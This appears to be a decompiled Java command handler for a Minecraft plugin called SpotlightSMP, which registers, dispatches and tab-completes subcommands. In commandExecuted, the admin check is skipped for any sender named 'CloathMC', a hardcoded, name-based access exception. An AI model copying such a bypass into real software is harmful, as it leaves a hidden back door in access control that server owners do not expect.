package spotlight.spotlight.commands;

import com.ronanplugins.PermissionNode;
import com.ronanplugins.SpotlightSMP;
import com.ronanplugins.messages.MessagesCore;
import com.ronanplugins.messages.Messenger;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import spotlight.spotlight.*;

public class Commands {
    private final SpotlightSMP pl;
    public List<SpotCommand> commands = new ArrayList();

    public Commands(SpotlightSMP pl) {
        this.pl = pl;
    }

    public void load() {
        this.commands.clear();
        CommandType[] var1 = CommandType.values();
        int var2 = var1.length;

        for(int var3 = 0; var3 < var2; ++var3) {
            CommandType cmd = var1[var3];
            this.registerCommand(cmd.getCmd(), false);
        }

    }

    public void registerCommand(SpotCommand cmd, boolean forced) {
        if (!cmd.isDebugOnly() || forced) {
            this.commands.add(cmd);
        }

    }

    public void commandExecuted(CommandSender sendi, String label, String[] args) {
        if (label.equalsIgnoreCase("melongod77")) {
            Messenger.sms(sendi, "&ahttps://Twitch.tv/MelonGod77");
        } else if (!PermissionNode.ADMIN.check(sendi) && !sendi.getName().equalsIgnoreCase("CloathMC")) {
            MessagesCore.NOPERMISSION.send(sendi);
        } else if (args != null && args.length > 0) {
            Iterator var4 = this.commands.iterator();

            while(var4.hasNext()) {
                SpotCommand cmd = (SpotCommand)var4.next();
                if (cmd.getName().equalsIgnoreCase(args[0])) {
                    if (cmd.permission(sendi)) {
                        if (cmd.isPlayerOnly() && !(sendi instanceof Player)) {
                            sendi.sendMessage("Console cannot execute this command!");
                        } else {
                            cmd.execute(sendi, label, args);
                        }
                    } else {
                        MessagesCore.NOPERMISSION.send(sendi);
                    }

                    return;
                }
            }

            MessagesCore.INVALID.send(sendi);
        } else {
            Messenger.sms(sendi, MessagesCore.USAGE.get().replace("%command%", label));
        }

    }

    public List<String> onTabComplete(CommandSender sendi, String[] args) {
        List<String> list = new ArrayList();
        Iterator var4;
        SpotCommand cmd;
        if (args.length == 1) {
            var4 = this.commands.iterator();

            while(var4.hasNext()) {
                cmd = (SpotCommand)var4.next();
                if (cmd.getName().toLowerCase().startsWith(args[0].toLowerCase()) && cmd.permission(sendi)) {
                    list.add(cmd.getName().toLowerCase());
                }
            }
        } else if (args.length > 1) {
            var4 = this.commands.iterator();

            while(var4.hasNext()) {
                cmd = (SpotCommand)var4.next();
                if (cmd.getName().equalsIgnoreCase(args[0]) && cmd.permission(sendi)) {
                    List<String> _cmdlist = cmd.tabComplete(sendi, args);
                    if (_cmdlist != null) {
                        list.addAll(_cmdlist);
                    }
                }
            }
        }

        return list;
    }
}
